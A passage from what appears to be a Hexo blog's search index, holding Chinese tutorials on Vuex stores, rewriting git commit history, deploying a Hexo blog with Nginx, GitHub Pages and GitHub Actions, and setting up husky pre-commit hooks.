class="line">        &#125;,</span><br><span class="line">        <span class="title function_">setLoginOut</span>(<span class="params">state</span>) &#123;</span><br><span class="line">            state.<span class="property">isLogin</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">actions</span>: &#123;</span><br><span class="line">        <span class="attr">getUserStatus</span>: <span class="keyword">async</span> (store, payload) =&gt; &#123;</span><br><span class="line">            <span class="comment">// do somethings</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">getUserDetail</span>: <span class="keyword">async</span> (store, payload) =&gt; &#123;</span><br><span class="line">            <span class="comment">// do somethings</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getters</span>: &#123;&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createUserState</span><br></pre></td></tr></table></figure><h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h1><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;computed&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;useStore&#125; <span class="keyword">from</span> <span class="string">&#x27;/src/store&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;state, dispatch&#125; = <span class="title function_">useStore</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ucid = <span class="title function_">computed</span>(<span class="function"><span class="params">state</span> =&gt;</span> state.<span class="property">user</span>?.<span class="property">ucid</span>)</span><br><span class="line"><span class="title function_">dispatch</span>(<span class="string">&#x27;user/getUserStatus&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vuex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 修改已提交的 commit 中的信息</title>
      <link href="/2022/07/96b4f5b384fd.html"/>
      <url>/2022/07/96b4f5b384fd.html</url>
      
        <content type="html"><![CDATA[<h1 id="修改某次-Commit"><a href="#修改某次-Commit" class="headerlink" title="修改某次 Commit"></a>修改某次 Commit</h1><p>调用 <code>git log</code> 查看 <strong>要修改的 commitId 前的一个 commitId</strong></p><p>然后调用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i &lt;commit <span class="built_in">id</span>&gt;</span><br></pre></td></tr></table></figure><p>进入 rebase 模式后，按 <code>i</code> 进入编辑模式，将修改的 commit 状态修改为 <code>edit</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改前：pick xxxxxx Commit Message</span><br><span class="line">修改后：edit xxxxxx Commit Message</span><br></pre></td></tr></table></figure><p>按 <code>esc</code> 后输入 <code>wq</code> 指令，按 <code>Enter</code> 确认退出 rebase 模式。</p><p>之后便可以执行修改指令：</p><ul><li>改作者和邮件地址：<code>git commit --amend --author=&quot;AuthorName &lt;email@address.com&gt;&quot;</code></li><li>改日期时间：<code>git commit --amend --date=&quot;Thu, 07 Apr 2005 22:13:13 +0200&quot;</code></li><li>改commit评注：<code>git commit --amend -m &quot;New Commit Message&quot;</code></li></ul><p>修改完成后执行 <code>git rebase --continue</code></p><p>最后将修改强行覆盖到远程仓库 <code>git push origin master --force</code></p><blockquote><p>原文地址：<a href="https://blog.csdn.net/Revivedsun/article/details/113002659">https://blog.csdn.net/Revivedsun/article/details/113002659</a></p></blockquote><h1 id="批量修改历史-Commit"><a href="#批量修改历史-Commit" class="headerlink" title="批量修改历史 Commit"></a>批量修改历史 Commit</h1><p>批量修改脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">git filter-branch --env-filter <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 之前的邮箱</span></span><br><span class="line"><span class="string">OLD_EMAIL=&quot;xxx@xxx.com&quot;</span></span><br><span class="line"><span class="string"># 修改后的用户名</span></span><br><span class="line"><span class="string">CORRECT_NAME=&quot;EsunR&quot;</span></span><br><span class="line"><span class="string"># 修改后的邮箱</span></span><br><span class="line"><span class="string">CORRECT_EMAIL=&quot;xxx@xxx.com&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_NAME=&quot;$CORRECT_NAME&quot;</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_EMAIL=&quot;$CORRECT_EMAIL&quot;</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_NAME=&quot;$CORRECT_NAME&quot;</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_EMAIL=&quot;$CORRECT_EMAIL&quot;</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">&#x27;</span> --tag-name-filter <span class="built_in">cat</span> -- --branches --tags</span><br></pre></td></tr></table></figure><p>脚本执行完毕后，使用 <code>git push origin --force</code> 即可</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 快速搭建指南</title>
      <link href="/2022/06/64163235c30f.html"/>
      <url>/2022/06/64163235c30f.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装与使用-Hexo"><a href="#1-安装与使用-Hexo" class="headerlink" title="1. 安装与使用 Hexo"></a>1. 安装与使用 Hexo</h1><p>hexo 官方网站：<a href="https://hexo.io/zh-cn/">链接</a></p><h2 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h2><p>全局安装 hexo-cli ，用以创建 hexo 项目：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装完成后，就可以在终端使用 <code>hexo</code> 指令了，可以使用以下指令创建一个 hexo 项目：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init hexo-blog</span><br><span class="line"><span class="built_in">cd</span> hexo-blog</span><br><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>完成后项目目录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml # 网站的基础配置，文档：https://hexo.io/zh-cn/docs/configuration</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds # 文章模板</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts # 你的 markdown 文章就需要存放在此目录下</span><br><span class="line">└── themes # 存放主题源码</span><br></pre></td></tr></table></figure><h2 id="1-2-安装第三方主题"><a href="#1-2-安装第三方主题" class="headerlink" title="1.2 安装第三方主题"></a>1.2 安装第三方主题</h2><h3 id="npm-安装"><a href="#npm-安装" class="headerlink" title="npm 安装"></a>npm 安装</h3><p>Hexo 5.0.0 版本以上，可以使用 npm 安装主题，简单易用、方便升级，但缺点是无法修改源码。</p><p>以 <a href="https://github.com/fluid-dev/hexo-theme-fluid">hexo-theme-fluid</a> 主题为例，使用 npm 安装只需要执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn add hexo-theme-fluid</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">npm install --save hexo-theme-fluid</span><br></pre></td></tr></table></figure><p>然后在博客目录下创建 <code>_config.fluid.yml</code>，将主题的 <a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">_config.yml</a> 内容复制进去。</p><h3 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h3><p>源码安装是老版本 Hexo 安装主题的方式，如果你项修改主题的源码也可以很方便的直接修改。</p><p>仍然以 <a href="https://github.com/fluid-dev/hexo-theme-fluid">hexo-theme-fluid</a> 主题为例，在项目的 <a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">Releases</a> 页面中下载源码文件：</p><p><img src="https://s2.loli.net/2022/06/05/ohY3uyv8btkKMjq.png" alt=""></p><p>下载解压后，在 <code>themes</code> 目录下创建一个 <code>fluid</code> 目录，将源码复制到该目录下，如下：</p><p><img src="https://s2.loli.net/2022/06/05/KuQ3kmH1Y4FClUx.png" alt=""></p><h3 id="应用主题"><a href="#应用主题" class="headerlink" title="应用主题"></a>应用主题</h3><p>当你安装成功后，需要在 <code>_config.yml</code> 中将使用的主题设置为你下载好的主题，找到 <code>theme</code> 配置项，将其修改为：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">fluid</span></span><br></pre></td></tr></table></figure><h3 id="配置第三方主题"><a href="#配置第三方主题" class="headerlink" title="配置第三方主题"></a>配置第三方主题</h3><p>如果你是以 npm 方式安装主题，你需要修改你刚才在博客目录下创建 <code>_config.fluid.yml</code> 文件修改相关配置；</p><p>如果你是以源码方式安装的主题，就不需要创建 <code>_config.fluid.yml</code> 文件了，只需要修改 <code>/themes/fluid/_config.yml</code> 文件中的配置就可以了。</p><blockquote><p>注意：每个主题的配置文件名称都不一样，主题的配置项也不一样，具体需要自行查看你安装主题的说明文档</p></blockquote><h1 id="2-部署-Hexo-到服务器"><a href="#2-部署-Hexo-到服务器" class="headerlink" title="2. 部署 Hexo 到服务器"></a>2. 部署 Hexo 到服务器</h1><p>如果你不想了解如何部署网站到服务器上，或者没有属于自己的服务器，你可以跳过这一章节，直接阅读第三节。</p><h2 id="2-1-获取编译好的-hexo-静态文件"><a href="#2-1-获取编译好的-hexo-静态文件" class="headerlink" title="2.1 获取编译好的 hexo 静态文件"></a>2.1 获取编译好的 hexo 静态文件</h2><p>可以使用 hexo-cli 的 generate 指令来生成静态博客，hexo-cli 已经将这一指令写入到 <code>package.json</code>，因此你可以使用 <code>npm/yarn</code> 指令来调用构建指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn build</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>博客目录下会生成一个 <code>public</code> 目录，这就是 Hexo 编译好的静态博客，接下来我们只需要将生成的静态文件部署到服务器上即可。</p><h2 id="2-2-Nginx"><a href="#2-2-Nginx" class="headerlink" title="2.2 Nginx"></a>2.2 Nginx</h2><p>服务器选择使用 Nginx 进行部署（of course，你也可以使用 Caddy）。</p><h3 id="安装-Nginx"><a href="#安装-Nginx" class="headerlink" title="安装 Nginx"></a>安装 Nginx</h3><p>首先在服务器上安装 nginx，以 Ubuntu 为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx</span><br><span class="line">systemctl enable nginx # 将 nginx 设置为开机启动项</span><br><span class="line">systemctl start nginx # 开启 nginx</span><br><span class="line">systemctl status nginx # 查看 nginx 状态</span><br></pre></td></tr></table></figure><p>官方完整安装文档：(链接)[<a href="https://www.nginx.com/resources/wiki/start/topics/tutorials/install/#official-debian-ubuntu-packages]">https://www.nginx.com/resources/wiki/start/topics/tutorials/install/#official-debian-ubuntu-packages]</a></p><h3 id="查看-修改-Nginx-配置"><a href="#查看-修改-Nginx-配置" class="headerlink" title="查看/修改 Nginx 配置"></a>查看/修改 Nginx 配置</h3><p>你可以使用 vim 指令查看 nginx 配置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><h2 id="2-3-部署博客"><a href="#2-3-部署博客" class="headerlink" title="2.3 部署博客"></a>2.3 部署博客</h2><h3 id="上传静态资源"><a href="#上传静态资源" class="headerlink" title="上传静态资源"></a>上传静态资源</h3><p>使用任意的 sftp 工具，mac 推荐使用 FileZilla，连接到服务器后，进入服务器的 <code>/var/www/html</code> 目录下，清空目录下原有的文件，然后将刚才编译好的 hexo 博客的静态文件上传至该目录下即可。</p><p>之后我们可以直接访问服务 ip 的 80 端口（即默认 http 的默认端口），就可以看到我们的网站了。</p><p>但是一般正规的网站是不会直接用 ip 访问的，因此我们需要为自己的网站绑定一个域名。</p><h3 id="为网站绑定域名"><a href="#为网站绑定域名" class="headerlink" title="为网站绑定域名"></a>为网站绑定域名</h3><p>进入你的域名解析控制台，以腾讯云的 DNSPod 为示例，点击添加记录，记录类型选择为 <code>A</code> 类型：</p><p><img src="https://s2.loli.net/2022/06/05/qFA7BurbpQXNsI5.png" alt=""></p><p>记录值填入你的服务器 ip，即完成了域名与服务器的绑定。</p><p>其中的『主机记录』意为二级域名的名称，假如你的域名为 <code>domain.xyz</code>：</p><ul><li>当你写为 <code>@</code> 时，用户访问 <code>domain.xyz</code> 会解析为你的主机 ip</li><li>当你写为 <code>*</code> 时，用户访问 <code>hi.domain.xyz</code> 与 <code>oh.domain.xyz</code> 等任意二级域名都会解析为你的主机 ip（一般不会这么干）</li><li>当你写为 <code>www</code> 时，用户访问 <code>www.domain.xyz</code> 会解析到你的主机 ip</li></ul><p>域名绑定成功后就可以直接使用域名访问你的博客啦！</p><h1 id="3-使用-github-io-展示网站"><a href="#3-使用-github-io-展示网站" class="headerlink" title="3. 使用 github.io 展示网站"></a>3. 使用 github.io 展示网站</h1><p>Github 提供了一个用以专门展示静态网站的服务，即为 <a href="https://docs.github.com/cn/pages/getting-started-with-github-pages/creating-a-github-pages-site">github.io</a>。</p><p>如果不是特别对网速有要求（毕竟 github.io 的服务器在国外），推荐你使用 github.io 来部署你的网站，可以省去很多部署步骤，可以完美与 Github Action 进行配合，进行自动化部署博客。</p><h2 id="3-1-项目上传到-Github"><a href="#3-1-项目上传到-Github" class="headerlink" title="3.1 项目上传到 Github"></a>3.1 项目上传到 Github</h2><p>在 Hexo 博客项目初始化 git 仓库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>然后在 Github 中创建一个新项目仓库，名称必须为 <code>&lt;你的github用户名&gt;.github.io</code>，创建完成后按照指引将你的博客代码上传到 github。</p><h2 id="3-2-开启-Github-Pages"><a href="#3-2-开启-Github-Pages" class="headerlink" title="3.2 开启 Github Pages"></a>3.2 开启 Github Pages</h2><p>在执行这一步之前，先创建一个没有任何代码的新分支，命名为 <code>release</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b release</span><br><span class="line"><span class="built_in">rm</span> -f * <span class="comment"># 确定你的当前目录没问题，把握不住删除指令的话就手动删除当前文件加的内容</span></span><br><span class="line">git push --set-upstream origin release <span class="comment"># 上传 release 分支 </span></span><br></pre></td></tr></table></figure><p>在项目的设置中找到 Github Pages，并将展示分支设置为刚才创建的 <code>release</code> 分支：</p><p><img src="https://s2.loli.net/2022/06/05/fmLnCi2SyZDJuN6.png" alt=""></p><p>这就意为这你在 <code>release</code> 上传的任何 html 都可以使用 <code>&lt;你的github用户名&gt;.github.io</code> 这个域名来访问了。</p><p>我们切回 <code>master</code> 分支，之后执行 <code>yarn build</code> 将生成的 <code>public</code> 目录下的文件复制一份，然后重新切回 <code>release</code> 分支，将刚才复制的内容粘贴到 <code>release</code> 分支下，并上传代码。如果没有操作失误的话，访问 <code>&lt;你的github用户名&gt;.github.io</code> 即可看到你的博客了。</p><h2 id="3-3-使用-hexo-deploy-指令"><a href="#3-3-使用-hexo-deploy-指令" class="headerlink" title="3.3 使用 hexo deploy 指令"></a>3.3 使用 hexo deploy 指令</h2><p>在上一步，我们演示了如何手动去将代码部署到 Github Pages 上，实际上 Hexo 提供了一个自动化的指令来帮助我们完成这一繁杂的过程，那就是使用 <a href="https://hexo.io/zh-cn/docs/one-command-deployment">hexo deploy</a> 指令。</p><p>但是使用之前要先安装 <code>hexo-deployer-heroku</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn add hexo-deployer-heroku</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">npm install hexo-deployer-heroku --save</span><br></pre></td></tr></table></figure><p>然后在 <code>_config.yml</code> 中找到 <code>deploy</code> 配置项，将其修改为：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:&lt;你的github用户名&gt;/&lt;你的github用户名&gt;.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">release</span></span><br></pre></td></tr></table></figure><p>然后再执行 <code>yarn deploy</code> 就可以自动化完成编译博客、切换分支、替换静态文件、上传代码这一系列操作。</p><h1 id="4-使用-Github-Action-自动化部署"><a href="#4-使用-Github-Action-自动化部署" class="headerlink" title="4. 使用 Github Action 自动化部署"></a>4. 使用 Github Action 自动化部署</h1><p>回顾一下上面的步骤，我们即使使用了 <code>hexo deploy</code> 指令，其实也很麻烦，需要我们在本地等漫长的编译过程，编译完了还要更新代码到 github 仓库上。为了简化这一流程，就可以选择使用 Github Action 来帮我们做自动化部署。</p><p>Github Action 可以实现在一个行为触发之后再执行一些其他的行为，利用这个能力我们就可以实现当我们写完一篇文章后，将代码 Push 到 Github 仓库的这一刻，让 Github 来帮我们完成编译以及部署这个流程，也就是实现持续集成（CI）、持续交付（CD）的这个效果。</p><p>关于 Github Action，详细教程可以查看 <a href="https://docs.github.com/cn/actions">官方文档</a>。按照文档中所描述的，只要我们在代码中添加一层 <code>.github/workflows</code> 目录，并且在目录下创建一个 <code>yml</code> 文件来描述具体的行为，就可以实现开启 Github Action。</p><p>如下是一个编写好的部署 hexo 博客的 yml 文件，你可以将其写入到 <code>.github/workflows/blog-deploy.yml</code> 文件中：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">hexo</span> <span class="string">blog</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;master&quot;</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build-and-deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">&quot;master&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">node</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;14&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">yarn</span> <span class="string">&amp;</span> <span class="string">Install</span> <span class="string">node_modules</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">borales/actions-yarn@v3.0.0</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">cmd:</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Check</span> <span class="string">yarn</span> <span class="string">&amp;</span> <span class="string">node</span> <span class="string">version</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          echo &quot;Node version is `node -v`&quot;</span></span><br><span class="line"><span class="string">          echo &quot;Yarn version is `yarn -v`&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">&amp;</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;GitHub Action&quot;</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;action@github.com&quot;</span></span><br><span class="line"><span class="string">          sed -i&#x27;&#x27; &quot;s~git@github.com:~https://$&#123;&#123; secrets.GH_TOKEN &#125;&#125;@github.com/~&quot; _config.yml</span></span><br><span class="line"><span class="string">          rm -rf .deploy_git</span></span><br><span class="line"><span class="string">          yarn clean</span></span><br><span class="line"><span class="string">          yarn build</span></span><br><span class="line"><span class="string">          yarn deploy</span></span><br></pre></td></tr></table></figure><p>保存后提交代码后，就可以在你的博客的 Github 项目仓库里的 Actions 标签页里找到创建好的 workflow 了，并且当你 push 代码时，这个工作流就会被触发：</p><p><img src="https://s2.loli.net/2022/06/05/7a1uWv2npsr4lIj.png" alt=""></p><p>但其实它最终会失败的，因为我们还有一步没有完成。在上面的脚本中使用了一个 Github Action 的 <a href="https://docs.github.com/cn/actions/learn-github-actions/contexts#secrets-context">secrets 上下文</a>，即 <code>$&#123;&#123; secrets.GH_TOKEN &#125;&#125;</code> 这里。</p><p><code>$&#123;&#123; xxx &#125;&#125;</code> 是 Github Action 中的特定模板语法，可以获取到一些 Github 相关的内置的系统变量（姑且这么说吧），但又区区别与 Github Action 的环境变量。我们这里获取的 <code>secrets.GH_TOKEN</code> 是 Github Personal access token，获取这个 token 的目的是为了让当前的 Github Action 工作流有向我们的项目推送代码的权限。</p><p>首先我们要获取这个 Token，你可以在你的用户头像菜单里选择 <code>Setting</code>，进入设置后选择 <code>Developer settings</code>，再选择 <code>Persona access token</code> 就可以看到它了：</p><p><img src="https://s2.loli.net/2022/06/05/UDtl18ExRyO24nK.png" alt=""></p><p>点击右上角的 <code>Generate new token</code> 按钮生成新的 Token，填写一个你比较容易区分的备注后，勾选 <code>repo</code> 和 <code>workflow</code> 权限，并将 <code>Expiration</code> 过期时间选为 <code>No expiration</code>：</p><p><img src="https://s2.loli.net/2022/06/05/Ar3V247LEmTUofS.png" alt=""></p><blockquote><p>这个 Token 相当重要，千万不能泄露，如过泄露立刻重置该 token ！！！</p></blockquote><p>点击 <code>Generate token</code> 按钮后，就会生成一个 <code>ghp</code> 开头的 token，你需要在此复制该 token（后面不能再查看了，只能重新生成）:</p><p><img src="https://s2.loli.net/2022/06/05/Uk4xcMfPdsDHmYg.png" alt=""></p><p>复制该 token 后，进入到博客仓库的设置中，选择 <code>Secrets - Actions</code>，点击 <code>New repository secret</code> 按钮生成一个密钥信息：</p><p><img src="https://s2.loli.net/2022/06/05/dx3XuegCo7UGAPb.png" alt=""></p><p>我们将密钥名称写为 <code>GH_TOKEN</code>，值填入刚才复制的 Github token：</p><p><img src="https://s2.loli.net/2022/06/05/RGYbpPB4CDLS5kc.png" alt=""></p><blockquote><p>这里所新建的 secret 字段，就可以被 Github Action yml 配置中的 <code>secret</code> 上下文对象所获取到。</p></blockquote><p>至此 Github Action 工作流就可以正常使用了，你可以愉快的开始写你的博客啦，你的每次提交 Github Action 都会帮你进行自动部署，enjoy yourself ~</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 husky 每次提交时进行代码检查</title>
      <link href="/2022/05/d36522b1089c.html"/>
      <url>/2022/05/d36522b1089c.html</url>
      
        <content type="html"><![CDATA[<h1 id="Husky-简述"><a href="#Husky-简述" class="headerlink" title="Husky 简述"></a>Husky 简述</h1><p>了解 Husky 前就必须先了解一下 GitHook 是什么，GitHook 可以在执行代码的 commit、push、rebase 等阶段前触发，做一些前置行为，比如在每次提交代码时候执行一段 shell 脚本，来做一些代码检查或者通知 ci 等操作。</p><p>但是对于如何使用好 GitHook 可能会让很多人头疼，因为大多数人可能不知道如何去写 shell 脚本，亦或者是对 .git 文件内的内容一无所知。因此，Husky 采用了更简单的一种方式，让管理 GitHook 更加现代化，正如 husky 简介中所说的：</p><blockquote><p>Modern native Git hooks made easy</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>首先需要使用 npm 安装 husky：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install husky --save-dev</span><br></pre></td></tr></table></figure><p>安装成功之后需要调用 husky 指令来进行初始化：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx husky install</span><br></pre></td></tr></table></figure><p>你可以将 <code>husku install</code> 写入 package.json，方便其他人安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm set-script prepare <span class="string">&quot;husky install&quot;</span></span><br></pre></td></tr></table></figure><p>这时，项目根目录会生成一个 .husky 文件夹，其内容为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── .husky</span><br><span class="line">    └── _</span><br><span class="line">        ├── .gitignore</span><br><span class="line">        └── husky.sh</span><br></pre></td></tr></table></figure><p>之后我们就可以使用指令添加 hook 了，比如我想在每次 commit 前执行 <code>npm lint</code> 脚本，那么就可以使用如下指令添加该操作：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx husky add .husky/pre-commit <span class="string">&quot;npm run lint&quot;</span></span><br></pre></td></tr></table></figure><p>之后 husky 就会生成一个 <code>pre-commit</code> 的脚本文件在 <code>.husky</code> 文件夹下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└── .husky</span><br><span class="line">    ├── _</span><br><span class="line">    │   ├── .gitignore</span><br><span class="line">    │   └── husky.sh</span><br><span class="line">    └── pre-commit</span><br></pre></td></tr></table></figure><h1 id="与-lint-staged-协同使用"><a href="#与-lint-staged-协同使用" class="headerlink" title="与 lint-staged 协同使用"></a>与 lint-staged 协同使用</h1><p><a href="https://github.com/okonet/lint-staged">lint-staged</a> 是一个专门用于在提交代码前对代码进行风格约束的工具，他可以很好的与 